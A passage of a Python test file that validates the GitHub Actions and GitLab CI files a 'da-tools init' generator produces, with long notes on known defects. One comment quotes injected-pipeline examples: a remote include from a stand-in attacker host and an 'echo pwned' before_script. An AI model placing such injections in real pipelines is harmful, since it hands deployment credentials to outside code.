#!/usr/bin/env python3
"""Structural validation of the CI/CD artifacts `da-tools init` SHIPS (#1347).

WHY THIS FILE EXISTS
--------------------
`scripts/tools/ops/init_project.py` generated a GitHub Actions workflow whose
``apply`` block sat at column 0 — a TOP-LEVEL workflow key instead of a job.
GitHub rejects such a file *in its entirety*, so every customer who ran the
default `da-tools init` (`--ci` defaults to ``both``, and pressing Enter in the
interactive flow picks ``both`` too) got a workflow that never ran at all. All
three ``--deploy`` variants shipped that way.

⛔ The pre-existing tests did NOT lack a parser — that is the tempting and
wrong diagnosis. ``tests/ops/test_init_project.py`` already ran
``yaml.safe_load`` over the generated workflow, and already parametrized all
nine ``--ci`` × ``--deploy`` combinations. The file was *valid YAML*, ``jobs``
*was* present, and the files *were* created — so every one of those assertions
was true while the artifact was unusable. The gap was that nothing checked the
artifact against the schema of the system that consumes it, and every other
assertion was a substring match, which is indifferent to indentation.

So: hand the artifacts to the REAL validators.

WHAT THIS GUARD BUYS
--------------------
* GitHub Actions workflows → ``actionlint`` (the same engine and the same
  ``-shellcheck= -pyflakes=`` argument pinning the repo already uses on its own
  workflows via .pre-commit-config.yaml). It rejects the #1347 shape with
  ``unexpected key "apply" for "workflow" section``.
* GitLab CI pipelines → ``check-jsonschema --builtin-schema vendor.gitlab-ci``.
* Offline structural assertions that need no binary at all, so a runner missing
  both tools still gets the #1347 class caught (top-level key set, job names,
  GitLab stage references, and which files each ``--ci`` value may emit).
* Job REACHABILITY (#1356) — that every job has at least one event under which
  its own ``if:`` and its whole transitive ``needs`` closure can all hold. No
  linter checks this; see the section-3b header for the mechanic.

WHAT THIS GUARD DOES **NOT** BUY
--------------------------------
⛔ Read this before assuming a green run means the generated pipeline works.

* **It does not prove the commands inside can run.** actionlint validates
  workflow syntax and expression semantics, not the runner's software
  inventory. The concrete live counter-example: the ``argocd`` branch emits
  ``argocd app sync …`` on a bare ``ubuntu-latest`` runner, which has no
  ``argocd`` binary — that job fails at execution time and this file stays
  green. Tracked as issue #1350.
* **It does not build the generated kustomize tree.** ``--deploy kustomize``
  scaffolds ``kustomize/`` + a README telling the user to create symlinks; the
  workflow's ``kustomize build`` step is never exercised here. Deliberately out
  of scope for this PR — tracked as issue #1349.
* **It does not verify the portal preview's YAML matches the CLI's.** The portal
  wizard's sample workflow is a SEPARATE hand-written string; this file only
  proves it is a loadable workflow with no unreachable job. On the actionlint
  axis it already passed before this file existed (all three deploy branches),
  so that leg PINS THE STATUS QUO; on the #1356 reachability axis it was
  genuinely broken and is genuinely fixed here. Divergence between the two
  generators on every other YAML axis remains issue #1351.

  ⚠️ The wizard's OTHER claim — its file tree, i.e. which files ``init`` writes
  — *is* now held to the CLI, by section 5. That assertion was absent while an
  earlier version of this bullet said the portal was unchecked in general, and
  the gap it was hiding was live: the wizard promised ``kustomize/`` and
  ``argocd/`` for ``--deploy argocd`` and ``run_init`` writes neither.
* **It does not make ``--deploy argocd`` a working deployment.** Section 5 now
  stops the wizard from *claiming* files the CLI never writes, but the product
  gap underneath is untouched and is deliberately out of scope: ``run_init``
  gates every deployment artifact on ``deploy == 'kustomize'`` — with ONE
  exception this paragraph used to deny. ⛔ It previously said an argocd user
  gets ``conf.d/`` + CI files "and nothing else"; that was false, and false in a
  way this very PR should have caught, because the same PR taught
  ``_preview_files`` about the exception. GitOps Native Mode
  (``config_source='git'``) writes ``kustomize/overlays/gitops/`` for ANY deploy
  method. Measured: ``--deploy helm|argocd --config-source git`` produces
  exactly those two files and NO ``kustomize/base/`` — while the overlay they
  contain declares ``resources: [../../base]``. That is a dangling reference and
  ``kustomize build`` cannot resolve it. ⚠️ The dry-run/actual set-equality test
  added in this PR does NOT catch that: both sides contain the same two files,
  so it pins the broken combination as correct. Tracked with the rest of the
  product-level gaps below; the assertion this file makes is about the two
  file-lists agreeing, never about the files being usable.

  Back to the argocd branch: it gets no Application manifest, and no
  ``kustomize/overlays/prod`` for one to point at (the tree
  ``docs/scenarios/gitops-ci-integration.md`` §3.3 tells them to target). The
  generated apply stage still runs ``argocd app sync dynamic-alerting``, which
  syncs an Application that was never scaffolded. Making the CLI emit it needs a
  ``repoURL`` the wizard never collects, i.e. a CLI-surface change — owner
  decision, same disposition as #1349/#1350. ``--deploy helm`` is in the same
  position (its apply reads an ``environments/prod/values.yaml`` that ``init``
  does not create).
* ⛔ **ERRATUM — the exemption previously written here was wrong, and wrong in a
  way worth keeping on the record.** It said: feeding the scaffolded `conf.d/`
  to `validate_config.py` "would start life green and stay green until some
  future schema change", and used that to justify not building the check. The
  measurement behind that sentence is broken: `validate_config`'s known-key set
  IS the sibling `_defaults.yaml` in the same directory, and `init` writes both
  from one catalog — so the probe carries its own fix and 100% bogus keys still
  pass 5/5. The right thing to measure is the REGISTRY identity, and that guard
  would open **36 red** on today's output (nginx / clickhouse / db2 score zero
  against `threshold-registry.yaml`) — the opposite of what the exemption
  predicted. Tracked as #1387, together with the reason the existing
  reachability gate misses it. **A probe that cannot go red is not evidence of
  health; it is a broken instrument.**
* **One coverage gap left open on purpose.** The wizard's third claim surface,
  `cicdGenerateInitCommand`, is checked only by substring in the portal suite;
  its five flags were verified against `_build_parser()` by hand and all exist,
  so a guard there starts green with no counterfactual to show for it. Worth
  building, not built here — this file's own history is that every guard added
  in a hurry shipped with one half of its mechanism missing.
* **The exit-code contract is now checked on the GitHub leg only.**
  `config_diff.py` exits 1 whenever there ARE changes (the `diff(1)`
  convention, codified by dev-rules #13), and both generated legs used to
  invoke it bare. A bare call cannot work: rc=1 is an ORDINARY outcome, so the
  stage failed on exactly the pull requests it exists to report on, and the
  comment step (which inherits an implicit `success()`) never ran. ⛔ Do NOT
  read this as "the job only runs when conf.d changed, so rc=1 was certain" —
  an earlier draft of this docstring said that, and it is wrong: the job also
  runs for `kustomize/` and `rule-packs/` edits, so **rc=0 is reachable and
  normal**. The always-empty baseline is what made every run report changes.
  The GitHub leg now captures the code and applies the contract that
  `docs/integration/gitops-deployment.md` already documented for consumers
  (0 skip / 1 report / 2 fail), the shape this platform's own
  `.github/workflows/config-diff.yaml` has carried in its `Run config diff`
  step since it was burned by the same thing (cited by step name, not by line
  range — a range drifts the moment anything above it moves, and nothing here
  would notice). **The GitLab leg still invokes it bare** — see the
  deferral recorded on `test_generate_stage_body_is_pinned_on_both_legs`.
  ⛔ That deferral's original premise — "nothing loads the GitLab pipeline
  anyway" — NO LONGER HOLDS, and the test that used to pin it says the
  opposite now. `test_gitlab_deferral_premise_still_holds` asserted that NO
  root `.gitlab-ci.yml` is written; #1357 made `da-tools init` write one, so
  that test was renamed to `test_gitlab_root_shell_wires_the_pipeline` and
  its greenfield polarity INVERTED — it now asserts the root shell IS
  created and DOES `include:` the generated pipeline (its brownfield half,
  "an existing root file is left byte-identical", kept its polarity but
  changed meaning: tripwire → specification). So the bare invocation below
  is a LIVE defect, not a dormant one. Do not cite the old name; it is gone.
  ⚠️ What is still NOT asserted anywhere: that a *consumer* honours the
  contract. Both guards in the blast-radius step ARE now observed — see
  `test_generated_blast_radius_step_honours_the_exit_contract`, which runs the
  shipped step against a `docker` stub across rc=0/1/2/125/137 with and
  without a report. What that stub cannot check is the half in front of it:
  whether the MOUNTS are right, and whether the real image actually exits the
  way this contract assumes. Those need a daemon and a published image.
* **Reachability is now asserted, on both legs (#1357, fixed).** It used not to
  be: the pipeline was written to ``.gitlab-ci.d/dynamic-alerting.yml``, GitLab
  auto-loads a root ``.gitlab-ci.yml`` only, and nothing generated one or told
  the customer to ``include:`` ours — so on their instance the whole file was
  inert while both validators, handed the path directly, were perfectly happy.
  "Valid pipeline" and "pipeline that runs" are different claims and only the
  first was asserted. ``da-tools init`` now also emits a root ``.gitlab-ci.yml``
  whose entire body is ``include: [local: .gitlab-ci.d/dynamic-alerting.yml]``,
  and ``test_generated_ci_config_is_reachable_or_ships_wiring`` holds the
  general property — every generated CI artifact is either at a location its
  platform auto-loads, or is wired in from one, or carries the wiring
  instructions itself — with a control case proving the classifier can say no.
  ⛔ What is still NOT checked: that GitLab resolves that ``local:`` include the
  way the docs say. That needs a real instance, same boundary as the
  ``exists:`` note below.
  ⚠️ **Consequence worth reading before touching the GitLab leg:** it is now
  REACHABLE, so the defects listed on
  ``test_generate_stage_body_is_pinned_on_both_legs`` stopped being theoretical.
  See the note there.
* **It executes the shell of TWO steps, and reads the rest.** actionlint
  parses ``run:`` blocks (and could shell-check them, but that integration is
  pinned off — see the ``-shellcheck=`` note). The generate job's "Resolve base
  config snapshot" and "Config diff (blast radius)" steps are observed doing
  what they do; every other ``run:`` in this file — both apply legs, the
  validate stage, the whole GitLab pipeline — is still text-only, so a defect
  living in one of those is exactly as invisible today as #1358 was.

  Those two exceptions exist because reading was demonstrably not enough. The
  step it now runs used to carry TWO defects at once, and measuring mattered
  because fixing only the visible one changed nothing:

    1. ``actions/checkout@v4`` was generated with no ``fetch-depth``, so the
       runner had a depth-1 clone and the base commit object was simply
       absent. ``git show <base.sha>:conf.d`` therefore failed FIRST,
       short-circuiting the ``&&`` — the ``git archive | tar`` half never ran.
    2. Had it run, it would have failed too: it untarred into
       ``.output/base/`` while the preceding step created only ``.output``.

  Either way the ``||`` fallback swallowed it into an empty baseline and the
  step exited 0, so every PR reported every tenant as ADDED. Executing the
  step showed every state — including the one where the base commit and the
  config directory were both present — returning exit 0 with nothing
  extracted, which is what made #2 visible at all.

  Both are fixed on the GitHub leg (#1358). ⛔ The GitLab leg still carries
  the equivalent defect and is deliberately NOT fixed here — but it is no
  longer unreachable, so this is now a live defect rather than a dormant one.
  See ``test_generate_stage_body_is_pinned_on_both_legs``, whose deferral
  paragraph records exactly what changed, and
  ``test_gitlab_root_shell_wires_the_pipeline``, which pins the wiring that
  made it live. ⛔ So does the portal
  wizard's preview generator, and worse (it passes ``--old-dir`` a path it
  never mounts); that divergence is #1351, and this change widens it.

  ⚠️ **The GitLab half is broken too, and for a THIRD reason** — an earlier
  version of this paragraph said it "relies on the same base commit being
  present and does not pin a depth either", which is true and is NOT the
  operative cause. That job runs ``git archive $CI_MERGE_REQUEST_DIFF_BASE_SHA``
  inside ``image: $DA_TOOLS_IMAGE``, and **that image has no git**:
  ``components/da-tools/app/Dockerfile`` is ``FROM python:3.13.13-alpine3.22``
  and only ever runs ``apk --no-cache upgrade`` — it never installs one.
  So the command is ``git: not found``, ``2>/dev/null || true`` swallows it, and
  ``.output/base/conf.d`` stays empty on every merge request. No fetch-depth
  change would help; the fix is a git in the image or a different way to fetch
  the baseline. Correcting this matters because the wrong cause is the sentence
  a future reader would have acted on.

  The PORTAL preview has its own, worse instance of the same class, also not
  fixed here: its "Compute blast radius" step mounts only ``conf.d`` yet passes
  ``config-diff --old-dir /data/conf.d.base``. Nothing ever creates that path
  and — unlike the CLI copy — there is no ``||`` fallback, so the step fails
  outright on a real runner. Both validators accept it because a `run:` block is
  opaque to them, which is precisely this boundary.
* **`lint-custom-rules`'s `exists: ["rule-packs/custom/"]` may never match, and
  this file now pins it.** The vendored GitLab schema describes ``exists`` as
  matching an existing **file**; a trailing-slash directory path matches no
  blob. The sibling ``changes:`` in the same rule spells the same tree as
  ``rule-packs/custom/**/*``, which suggests the directory form was meant as a
  "does this directory exist" check. If it never matches, the job is never
  created — and the failure-semantics argument written into the generator for
  that job is moot, with the dead rule now cemented by an exact pin.
  ⛔ NOT verified here: it needs a real GitLab instance, which nothing in this
  suite has. Stated rather than guessed at, and deliberately not "fixed" by
  changing the rule on a hunch — a pin over an unverified premise is the shape
  this file spent several rounds removing.
* **`CONFIG_DIR` can only ever be half-live, and that is structural.** The
  generated tool invocations honour it, but ``on.push.paths`` /
  ``on.pull_request.paths`` (GitHub) and ``rules.changes`` (GitLab) accept
  literals only — no expressions, no variables. ⛔ A third site this
  enumeration originally missed: the generated pre-commit hooks' ``files:``
  regex. An enumeration inside a stated boundary is itself a claim, and this
  one was incomplete — the same class of miss the boundary describes. ⚠️ It
  went stale a second way: the GitHub base-config step used to spell
  ``conf.d`` literally in ``git show``/``git archive``, and no longer does —
  that step now reads ``$CONFIG_DIR`` throughout, and ``git show`` is not in
  it at all. The GitLab leg still hardcodes the directory in its ``mkdir`` and
  its ``--old-dir``, so the boundary holds, but anyone grepping for the
  command named here would not find it. So a customer
  who sets ``CONFIG_DIR: configs`` gets tools reading the right directory while
  the trigger filters match none of their files. The knob-reachability assertion
  above answers "is it read AT ALL", which this satisfies; it cannot answer "is
  it honoured everywhere", and no assertion here does. Renaming the config
  directory is therefore NOT supported by this generator, whatever the variable
  suggests.
* **The GitHub `apply` is gated on the EVENT, not on the ref.**
  ``workflow_dispatch`` says only that a human pressed Run; the branch is chosen
  in that dialog by anyone with write access, so the GitHub deploy remains
  dispatchable from an unmerged branch. The GitLab side is now pinned to the
  default branch, which makes the two DIFFERENT, not aligned — earlier wording
  here and in the generator claimed parity and was wrong. Closing it needs
  ``github.ref`` inside the job's ``if:``, and ``_EVENT_EQ_RE`` refuses ``&&``
  (measured: the natural fix reds 6 tests), so the evaluator has to grow first.
* **The GitLab `apply` has no dependency on validation, and this file does not
  ask for one.** The GitHub sibling is protected by ``needs: [validate]`` (see
  the #1356 reasoning below — losing that edge deploys an unvalidated config).
  The GitLab job declares no ``needs:`` at all, and stage ordering only orders
  jobs THAT EXIST: ``validate-config`` carries ``rules: - changes: [conf.d/**,
  rule-packs/**]``, so a push to the default branch touching only
  ``kustomize/overlays/prod/`` creates a pipeline whose ONLY job is ``apply`` —
  a manual production deploy of the very file just changed, with nothing having
  validated anything. The trigger-scope guard added here constrains WHO can
  press the button and from which branch; it does not give the button a
  prerequisite. Adding one is a change to the customer's deploy flow (a
  ``needs:`` on a job that may not be created fails pipeline creation outright,
  so the real fix is to make validation unconditional on the default branch)
  and is deliberately left to its own change rather than folded in here.
* **``--deploy helm`` emits a step that reads a file this generator never
  writes.** Both the GitHub and GitLab helm branches run ``helm upgrade
  --install ... -f environments/prod/values.yaml``, and no code path creates
  ``environments/``. The customer's first apply dies on ``no such file or
  directory``. Related and equally undisclosed until now: **no branch
  establishes cluster credentials at all** — there is no kubeconfig, no
  ``secrets.*`` reference, no cloud-auth action anywhere in the generated
  artifacts. Both validators pass regardless, because neither claim is about
  syntax.

BINARY ABSENCE POLICY
---------------------
Missing binary → ``skipif`` (dev hosts stay usable). But when the CI job that
INSTALLS the binary says so via ``VIBE_REQUIRE_ACTIONLINT`` /
``VIBE_REQUIRE_CHECK_JSONSCHEMA`` / ``VIBE_REQUIRE_NODE`` /
``VIBE_REQUIRE_SHELL_TOOLS``, a missing binary is a FAILURE — a regressed
install step must not silently turn this whole file into a green no-op.
The fourth of those covers ``git``/``bash``/``tar``, which are what the
execution-based tests need; ``ubuntu-latest`` ships them, so an absence is a
regressed runner image rather than an optional check. Same fail-closed pattern as ``VIBE_REQUIRE_MTAIL`` / ``_VECTOR``
/ ``_HELM`` / ``_DOCKER`` in ``.github/workflows/ci.yml`` (see
``tests/helm/test_federation_store_namespace_guard.py`` for the test-side
precedent).

⚠️ **The dev container has ``check-jsonschema`` but not ``actionlint``.** There
is no ``install-actionlint.sh`` beside ``install-promtool.sh`` /
``install-vector.sh``, and pre-commit's ``language: golang`` environment is not
on ``PATH``. So ``make dc-test`` validates the GitLab leg and silently SKIPS the
actionlint-gated tests — the leg that actually carried #1347 — with no
``VIBE_REQUIRE_*`` signal, because that flag is only set in CI. CI itself is
covered; the gap is local pre-push confidence. Installing it needs a pinned
download script plus its own parity test, so it is stated here rather than
half-done: **do not read a green ``make dc-test`` as covering the GitHub leg.**
"""
from __future__ import annotations

import ast
import functools
import itertools
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from pathlib import Path, PurePosixPath

import pytest
import yaml

_TESTS_DIR = Path(__file__).resolve().parents[1]
_REPO_ROOT = _TESTS_DIR.parent

# ⛔ Keep these as ONE literal path string each. scripts/tools/dx/verify_diff.py
# builds its source→test map by scanning test files for literal path strings; a
# `/ "scripts" / "tools"` split form registers this guard against NOTHING, so a
# change to the generator would not select it (the #1313 lesson).
_INIT_PROJECT = _REPO_ROOT / "scripts/tools/ops/init_project.py"
_PORTAL_GENERATORS = (
    _REPO_ROOT
    / "tools/portal/src/interactive/tools/cicd-setup-wizard/utils/generators.js"
)

sys.path.insert(0, str(_REPO_ROOT / "scripts" / "tools" / "ops"))
sys.path.insert(0, str(_TESTS_DIR / "ops"))

import init_project as ip  # noqa: E402
from test_init_project import CI_DEPLOY_COMBINATIONS  # noqa: E402


# ============================================================
# ── Binary discovery + fail-closed guards ──
# ============================================================

_ACTIONLINT = shutil.which("actionlint")
_CHECK_JSONSCHEMA = shutil.which("check-jsonschema")
_NODE = shutil.which("node")

_needs_actionlint = pytest.mark.skipif(
    _ACTIONLINT is None, reason="actionlint not on PATH")
_needs_check_jsonschema = pytest.mark.skipif(
    _CHECK_JSONSCHEMA is None, reason="check-jsonschema not on PATH")
_needs_node = pytest.mark.skipif(_NODE is None, reason="node not on PATH")


def test_generator_sources_exist() -> None:
    """Both generators must still be where this file says they are.

    Also keeps ``_INIT_PROJECT`` / ``_PORTAL_GENERATORS`` referenced: those two
    literal path strings are what registers this guard in
    ``scripts/tools/dx/verify_diff_map.json``, so an "unused constant" cleanup
    would quietly stop a change to either generator from selecting this test.
    """
    for p in (_INIT_PROJECT, _PORTAL_GENERATORS):
        assert p.is_file(), f"missing {p}"


def test_shell_tools_present_when_required() -> None:
    """Fail-closed guard for the tests here that EXECUTE a generated step.

    ``test_generated_baseline_step_...`` and
    ``test_generated_blast_radius_step_honours_the_exit_contract`` both carry
    a ``skipif`` on ``_SHELL_TOOLS``, which keeps dev hosts usable — but they
    are also the only evidence in this file that is not a reading of the text,
    so they are the last things that should be allowed to vanish quietly.
    ``ubuntu-latest`` ships all three: an absence there means the runner image
    regressed, not that the check became optional.

    ⛔ The count is deliberately not written as a number here. Every singular
    phrasing of it ("the ONE test that executes…") went stale the moment the
    second executing test landed, in four separate files, and a regex sweep for
    the phrasing missed two more instances inside this very docstring because
    they put the verb after the noun. Name the tests or say "the tests"; do not
    count them in prose.
    """
    if os.environ.get("VIBE_REQUIRE_SHELL_TOOLS") == "1":
        missing = [t for t in _SHELL_TOOLS if shutil.which(t) is None]
        assert not missing, (
            f"VIBE_REQUIRE_SHELL_TOOLS=1 but {missing} not on PATH — the "
            "tests that execute a generated step would have skipped silently."
        )


def test_actionlint_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the GitHub leg."""
    if os.environ.get("VIBE_REQUIRE_ACTIONLINT") == "1":
        assert _ACTIONLINT is not None, (
            "VIBE_REQUIRE_ACTIONLINT=1 but no `actionlint` on PATH — the "
            "GitHub Actions assertions in this file would have skipped "
            "silently. Check the 'Install actionlint' step in ci.yml."
        )


def test_check_jsonschema_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the GitLab leg."""
    if os.environ.get("VIBE_REQUIRE_CHECK_JSONSCHEMA") == "1":
        assert _CHECK_JSONSCHEMA is not None, (
            "VIBE_REQUIRE_CHECK_JSONSCHEMA=1 but no `check-jsonschema` on PATH "
            "— the GitLab CI assertions in this file would have skipped "
            "silently. It is installed by this job's pip install step."
        )


def test_node_present_when_required() -> None:
    """Fail-closed guard against silent disarmament of the portal-preview leg."""
    if os.environ.get("VIBE_REQUIRE_NODE") == "1":
        assert _NODE is not None, (
            "VIBE_REQUIRE_NODE=1 but no `node` on PATH — the portal CI/CD "
            "wizard preview would never be validated."
        )


# ============================================================
# ── The combination matrix (DERIVED, with an independent floor) ──
# ============================================================

def _cli_choices(dest: str) -> tuple[str, ...]:
    """Read an argument's `choices` off the real parser.

    Derived, not transcribed: a fourth `--deploy` method becomes a validated
    combination the moment it is added to the CLI.
    """
    parser = ip._build_parser()
    for action in parser._actions:
        if action.dest == dest:
            assert action.choices, f"--{dest} has no choices to derive from"
            return tuple(action.choices)
    raise AssertionError(f"no --{dest} argument on the init_project parser")


CI_CHOICES = _cli_choices("ci")
DEPLOY_CHOICES = _cli_choices("deploy")
MATRIX = sorted(itertools.product(CI_CHOICES, DEPLOY_CHOICES))

# Which artifact each `--ci` value is allowed to emit (mirrors run_init).
_EMITS_GITHUB = {"github", "both"}
_EMITS_GITLAB = {"gitlab", "both"}

GH_COMBOS = [c for c in MATRIX if c[0] in _EMITS_GITHUB]
GL_COMBOS = [c for c in MATRIX if c[0] in _EMITS_GITLAB]

_GH_WORKFLOW = Path(".github") / "workflows" / "dynamic-alerting.yaml"
_GL_PIPELINE = Path(".gitlab-ci.d") / "dynamic-alerting.yml"
# #1357 — the root shell. Written ONLY when the target repo has no root
# `.gitlab-ci.yml`; every fixture here initialises into an empty directory, so
# in this file it is unconditional for the gitlab-emitting combinations. The
# brownfield case has its own phase in
# `test_gitlab_root_shell_wires_the_pipeline`.
_GL_ROOT_SHELL = Path(".gitlab-ci.yml")


def test_matrix_matches_the_independent_hand_written_floor() -> None:
    """⛔ The anti-vacuity floor. Do not "simplify" this away.

    ``MATRIX`` is derived from the parser; ``CI_DEPLOY_COMBINATIONS`` is the
    hand-written list in ``tests/ops/test_init_project.py``. Comparing the two
    is the only reason the derivation is safe: if a ``--deploy`` choice were
    dropped from the CLI, a purely derived matrix would just parametrize fewer
    cases and every test below would still pass — pytest treats an EMPTY
    parametrize set as a skip and exits 0. Two independent sources make that
    shrinkage red instead of invisible, and make adding a fourth deploy method
    a deliberate two-file edit.

    The subset floors matter for the same reason: ``GH_COMBOS`` / ``GL_COMBOS``
    drive the binary-backed tests, so an empty subset would silently retire
    them.
    """
    assert set(MATRIX) == {tuple(c) for c in CI_DEPLOY_COMBINATIONS}, (
        f"parser-derived matrix {sorted(MATRIX)} disagrees with the hand-written "
        f"list in tests/ops/test_init_project.py "
        f"{sorted(tuple(c) for c in CI_DEPLOY_COMBINATIONS)}. Update BOTH — one "
        f"of them is the anti-vacuity floor for the other."
    )
    assert len(MATRIX) >= 9, f"only {len(MATRIX)} combinations — matrix collapsed"
    assert len(GH_COMBOS) >= 6, f"only {len(GH_COMBOS)} GitHub-emitting combinations"
    assert len(GL_COMBOS) >= 6, f"only {len(GL_COMBOS)} GitLab-emitting combinations"


# ============================================================
# ── Generation: the REAL writer, once per combination ──
# ============================================================

@pytest.fixture(scope="module")
def generated(tmp_path_factory) -> dict[tuple[str, str], Path]:
    """Run ``run_init`` (the real write path) once per combination.

    ⛔ Deliberately NOT calling ``_gen_github_actions`` / ``_gen_gitlab_ci``
    directly: half the contract under test is *which files get written where*.
    A dispatch bug that emits a GitLab pipeline under ``--ci github`` is
    invisible to a generator-level test and caught here.
    """
    out: dict[tuple[str, str], Path] = {}
    for ci, deploy in MATRIX:
        target = tmp_path_factory.mktemp(f"init-{ci}-{deploy}")
        ip.run_init(
            {
                "ci": ci,
                "deploy": deploy,
                "rule_packs": ["mariadb"],
                "tenants": ["db-a"],
                "namespace": "monitoring",
                "da_tools_image": "ghcr.io/vencil/da-tools:latest",
            },
            str(target),
        )
        out[(ci, deploy)] = target
    return out


def _run(cmd: list[str]) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd, capture_output=True, text=True, encoding="utf-8",
        errors="replace", timeout=180,
    )


# ============================================================
# ── 1. GitHub Actions: the real linter ──
# ============================================================

@_needs_actionlint
@pytest.mark.parametrize("ci,deploy", GH_COMBOS)
def test_generated_github_workflow_passes_actionlint(generated, ci, deploy) -> None:
    """The artifact must satisfy the schema of the system that consumes it.

    ``-shellcheck=`` / ``-pyflakes=`` are pinned OFF for the same reason
    .pre-commit-config.yaml pins them off: those optional integrations run
    "if installed", so leaving them implicit produces different findings on a
    Windows dev host than on an ubuntu runner.
    """
    path = generated[(ci, deploy)] / _GH_WORKFLOW
    proc = _run([_ACTIONLINT, "-shellcheck=", "-pyflakes=", str(path)])
    assert proc.returncode == 0, (
        f"actionlint rejected the workflow generated by "
        f"`da-tools init --ci {ci} --deploy {deploy}` — GitHub would refuse to "
        f"load it:\n{proc.stdout}\n{proc.stderr}"
    )


# ============================================================
# ── 2. GitLab CI: the real schema validator ──
# ============================================================

@_needs_check_jsonschema
@pytest.mark.parametrize("ci,deploy", GL_COMBOS)
@pytest.mark.parametrize(
    "artifact", [_GL_PIPELINE, _GL_ROOT_SHELL], ids=["pipeline", "root-shell"],
)
def test_generated_gitlab_pipeline_passes_schema(
    generated, ci, deploy, artifact,
) -> None:
    """``--regex-variant nonunicode`` matches GitLab's own RE2 flavour; the
    ``gitlab-ci`` data transform resolves the ``!reference`` tags the vendored
    schema expects.

    ⛔ BOTH emitted files, not just the big one (#1357). The root shell is the
    document GitLab actually parses; the pipeline it includes is reached only
    if that parse succeeds, so validating the included file alone grades the
    half that runs second. It is four lines and three of them are comments,
    which is exactly the kind of file whose validation gets skipped as
    obviously fine — `include:` alone is a legal pipeline per the schema, and
    that is a fact worth having asserted rather than assumed.
    """
    path = generated[(ci, deploy)] / artifact
    proc = _run([
        _CHECK_JSONSCHEMA,
        "--builtin-schema", "vendor.gitlab-ci",
        "--data-transform", "gitlab-ci",
        "--regex-variant", "nonunicode",
        str(path),
    ])
    assert proc.returncode == 0, (
        f"check-jsonschema rejected {artifact.as_posix()} generated by "
        f"`da-tools init --ci {ci} --deploy {deploy}`:\n"
        f"{proc.stdout}\n{proc.stderr}"
    )


# ============================================================
# ── 3. Offline structure (no binary required) ──
# ============================================================

# ⚠️ PyYAML implements YAML 1.1, where the bare key `on:` is a BOOLEAN, so the
# workflow's trigger block parses as the Python key `True`, not `"on"`. That is
# correct behaviour for a 1.1 parser and GitHub (YAML 1.2) reads the same file
# as `"on"` — so this is asserted as-is rather than "fixed" by quoting the key
# in the generator or post-processing the parse result.
_EXPECTED_GH_TOP_LEVEL = {"name", True, "env", "jobs", "permissions"}
_EXPECTED_GH_JOBS = {"validate", "generate", "apply"}

# GitLab top-level keywords that are configuration, not jobs.
# https://docs.gitlab.com/ee/ci/yaml/#keywords
#
# This IS an enumeration, which is normally the wrong shape for a guard — so
# note which way each error falls. Too WIDE (a job name accidentally listed
# here) would silently shrink the job set, which the exact `set(jobs) ==
# _EXPECTED_GL_JOBS` assertion below catches. (This used to point at a
# `len(jobs) >= 4` floor; the equality replaced it and the reference went
# stale — the protection moved, it did not disappear.)
#
# ⛔ Too NARROW used to be the unsafe direction, and the comment here claimed
# otherwise. It said a missing global keyword "misreads config as a job and
# fails loudly on the `stage` assertion" — true only for the ones that are
# mappings. SIX of these ten are lists or scalars (`stages`, `include`,
# `before_script`, `after_script`, `services`, and `image` in its scalar form),
# and the job filter dropped every non-dict, so a missing entry of that shape
# vanished silently instead. `_gitlab_jobs()` now asserts that every non-dict
# top-level key is one this set knows about, which makes the claim true rather
# than merely asserting it.
_GITLAB_GLOBAL_KEYWORDS = {
    "stages", "variables", "include", "default", "workflow",
    "image", "services", "before_script", "after_script", "cache",
}


def _gitlab_jobs(pipeline: dict) -> dict:
    """Job name -> body, with the unrecognised-keyword case made LOUD."""
    unknown_non_jobs = sorted(
        name for name, body in pipeline.items()
        if not isinstance(body, dict)
        and name not in _GITLAB_GLOBAL_KEYWORDS
        and not str(name).startswith(".")
    )
    assert not unknown_non_jobs, (
        f"top-level key(s) {unknown_non_jobs} are not mappings and are not in "
        "_GITLAB_GLOBAL_KEYWORDS. Either the generator grew a global keyword "
        "this set does not know about — add it — or it emitted a malformed "
        "job. Do NOT drop this: a non-dict key that is silently ignored is a "
        "job that quietly leaves every assertion below."
    )
    return {
        name: body for name, body in pipeline.items()
        if name not in _GITLAB_GLOBAL_KEYWORDS
        and not str(name).startswith(".")
        and isinstance(body, dict)
    }


# GitLab `rules:` keys that make an entry CONDITIONAL. An entry carrying none of
# them matches every pipeline — that is the rule, and it is why this is a
# derivation rather than a list of forbidden spellings.
_GITLAB_RULE_CONDITIONS = {"if", "changes", "exists"}

# WHOLE `if:` expressions a production-deploy rule entry may carry. Equality,
# not substring: `!=`, `||` and every other meaning-changing edit still contains
# the variable name, so a presence test grades the wrong thing entirely.
_GITLAB_DEPLOY_CONDITIONS = {
    "$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH",
}

# The generated GitLab pipeline's job set, pinned exactly (see the reasoning at
# the assertion — a new job is not covered by anything here by default).
_EXPECTED_GL_JOBS = {
    "validate-config", "lint-custom-rules", "apply",
}

# ⛔ The NON-deploy jobs' gates, pinned exactly. The deploy-trigger guard selects
# on `environment:`, so the three validation jobs were graded by nothing but
# "does the job still exist" — and their gate is where the damage is quiet:
# measured, pointing `validate-config`'s `changes:` at a path that matches
# nothing left 277 passed, and `when: never` left 83 passed, while the
# customer's only config-validation job stopped firing on every pipeline and
# `apply` stayed a live manual production deploy. The boundary paragraph in this
# file's header also argues FROM these rules, so leaving them unpinned made a
# stated boundary rest on an unenforced fact.
# ⛔ Top-level key set, exactly — the GitLab counterpart of the #1347 detector
# the GitHub leg already had. `_gitlab_jobs()` FILTERS the ten global keywords
# out before anything grades them, so an injected global was invisible by
# construction. Measured, both 95 passed and both accepted by check-jsonschema:
#   include: - remote: 'https://attacker.example/p.yml'   → third-party CI config
#                                                           pulled into a pipeline
#                                                           holding cluster-write
#                                                           credentials
#   default: before_script: [echo pwned]                  → a command injected into
#                                                           EVERY job, apply included
# ⛔ `generate-routes` is deliberately ABSENT (#1358 / option C). GitLab runs
# `script:` inside $DA_TOOLS_IMAGE, which has no `git`, so the blast-radius
# baseline could never be taken on this platform; the job reported every
# tenant as new and then failed on config-diff's ordinary exit code 1. A
# missing check is visible, a confidently wrong one is not. If it comes back,
# it comes back with `git` in the image and the GitHub leg's two-lookup shape.
_EXPECTED_GL_TOP_LEVEL = {
    "stages", "variables",
    "validate-config", "lint-custom-rules", "apply",
}

# job -> the stage it must run in. `stages:` order was pinned; each job's own
# `stage:` value was only checked for MEMBERSHIP, so moving `apply` to
